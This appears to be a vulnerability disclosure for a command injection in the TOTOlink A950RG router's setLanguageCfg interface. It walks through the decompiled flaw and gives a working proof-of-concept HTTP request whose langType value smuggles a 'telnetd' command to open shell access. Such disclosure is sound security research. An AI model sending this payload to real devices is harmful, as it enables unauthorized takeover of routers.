# TARGET
TOTOlink A950RG Router with firmware version V4.1.2cu.5204_B20210112

# BUG TYPE
Command Execution Vulnerability

# Abstract
The TOTOlink A950RG router contains a command execution vulnerability in the `setLanguageCfg` interface of the `/lib/cste_modules/global.so` library, specifically in the processing of the` langType` parameter. Due to insufficient input validation and filtering of user-controllable parameters, attackers can inject system commands through specially crafted malicious requests to the` langType` parameter. By exploiting this vulnerability, unauthorized attackers can execute arbitrary system commands, thereby gaining control over the affected router device.

# Details

![Snipaste_2025-04-08_00-46-39](figures/Snipaste_2025-04-08_00-46-39.png)

The vulnerability exists in the setLanguageCfg function of the global.so library. Analysis of the disassembled code reveals that the sprintf() function formats a string into the v9 buffer with the format string 'ln -s /web_cste/js/language_%s.js /web_cste/js/language.js 1>/dev/null 2>&1', where %s is replaced with the value of v6 (the user-supplied langType parameter). The CsteSystem() function then executes the command string in v9, calling the system to execute this command.

If an attacker injects malicious commands into variable v6 (the langType parameter), such as instructions to start the telnet service, these commands will be directly concatenated into the system call and executed. When the router executes CsteSystem(v9, 0), it not only processes the original language configuration functionality but also executes the injected malicious commands, potentially activating services that were previously disabled or performing other unauthorized operations.

Due to the lack of sufficient validation and filtering of user input before executing the CsteSystem command, conditions for command injection attacks are created. Attackers can exploit this command execution vulnerability by sending specially crafted API requests with malicious commands injected into the langType parameter, potentially resulting in complete system compromise.

# POC
Through BurpSuite packet capture tool, we can intercept data packets between the frontend and backend. By analyzing the packet structure, we can construct HTTP request packets containing command injection and send the requests. Through analysis of the returned packets, we can confirm the results of malicious command execution, thereby verifying the existence and exploitation effect of the vulnerability.

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 68
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/home.asp
Cookie: SESSION_ID=2:1744038027:2

{"topicurl":"setting/setLanguageCfg",
"langType" : "; telnetd &# "}
```

As shown in the results, the command injection was successful, and the target router device supports Telnet service, allowing shell access to the device via Telnet. Before the attack, the Telnet service was disabled, but after sending the crafted request with the injected command, the service was activated, confirming the vulnerability's existence and impact.

![Snipaste_2025-04-06_02-45-09](figures/Snipaste_2025-04-06_02-45-09.png)